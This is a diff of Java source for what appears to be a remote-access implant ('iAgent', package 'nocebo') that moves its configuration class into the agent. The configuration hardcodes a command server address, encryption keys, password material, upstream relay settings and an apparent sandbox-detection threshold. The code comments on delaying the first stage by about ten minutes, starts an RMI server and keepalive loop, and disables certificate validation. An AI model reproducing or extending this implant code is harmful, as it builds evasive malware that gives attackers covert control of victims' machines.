@@ -82,25 +82,27 @@ import java.awt.HeadlessException;
 import java.awt.Toolkit;
 
 
-class nConfig
-{
-    public static int locTcpPort = 49602;
-    public static String defaultKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
-    public static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
-    public static int metastasize = 0;
-    public static String server = "192.168.1.157";
-    public static int isDownstream = 0;
-    public static String upstreamSvc = "0000NocRemRegImplEx";
-    public static String upstreamHost = "null";
-    public static int upstreamPort = 35506;
-    public static int virtThreshold = 10; //6 for when it's ready
-    public static String passMat = "T__+Pmv.REW=u9iXBB-";
-    public static Hashtable endpoints = new Hashtable();
-}
+
 
 class iAgent
 {
+
+    public static class nConfig
+    {
+        public static String defaultKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
+        public static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
+        public static String server = "192.168.1.157";
+        public static int isDownstream = 0;
+        public static String upstreamSvc = "0000NocRemRegImplEx";
+        public static String upstreamHost = "null";
+        public static int upstreamPort = 35506;
+        public static int virtThreshold = 10; //6 for when it's ready
+        public static String passMat = "T__+Pmv.REW=u9iXBB-";
+        public static Hashtable endpoints = new Hashtable();
+    }
     //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nCore\*.java -d ..\server\fileroot
+    //ephemerals
+    static public int shutdown = 0;
     static public String cookieData = "null";
     static public String sessUUID = "";
     static public String nonce = "";
@@ -116,7 +118,7 @@ class iAgent
     static public P2PInterface ifaceP2P = null;
     static private security secInst = new security();
 
-    public static void init() throws RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+    public static String init() throws RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
         System.out.println("valhalla");
         //add execution delay of 10 minutes +/- to 1st stage
@@ -145,6 +147,7 @@ class iAgent
         srvObj.rmiServer();
 
         keepalive();
+        return "oops";
     }
 
     public static void keepalive() throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
@@ -935,9 +938,7 @@ class iAgent
             }
         }
 
-        
-
-
+    
         //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
         public class InvalidCertificateTrustManager implements X509TrustManager{
             @Override
